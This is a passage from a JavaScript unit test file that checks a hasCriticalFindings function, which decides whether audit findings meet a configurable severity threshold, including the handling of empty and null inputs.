  it("should return true when high severity findings exist", () => {
    const findings = [{ severity: "high" }];
    assert.ok(hasCriticalFindings(findings, {}));
  });

  it("should return false when only low severity findings exist", () => {
    const findings = [{ severity: "low" }];
    assert.ok(!hasCriticalFindings(findings, {}));
  });

  it("should use threshold semantics (at or above)", () => {
    const findings = [{ severity: "high" }];
    // medium threshold should catch high findings
    assert.ok(
      hasCriticalFindings(findings, { bomAuditFailSeverity: "medium" }),
    );
    // high threshold should catch high findings
    assert.ok(hasCriticalFindings(findings, { bomAuditFailSeverity: "high" }));
    // critical threshold should NOT catch high findings
    assert.ok(
      !hasCriticalFindings(findings, { bomAuditFailSeverity: "critical" }),
    );
  });

  it("should respect custom fail severity for medium", () => {
    const findings = [{ severity: "medium" }];
    assert.ok(
      hasCriticalFindings(findings, { bomAuditFailSeverity: "medium" }),
    );
    assert.ok(!hasCriticalFindings(findings, { bomAuditFailSeverity: "high" }));
  });

  it("should return false for empty findings", () => {
    assert.ok(!hasCriticalFindings([], {}));
    assert.ok(!hasCriticalFindings(null, {}));
  });
});
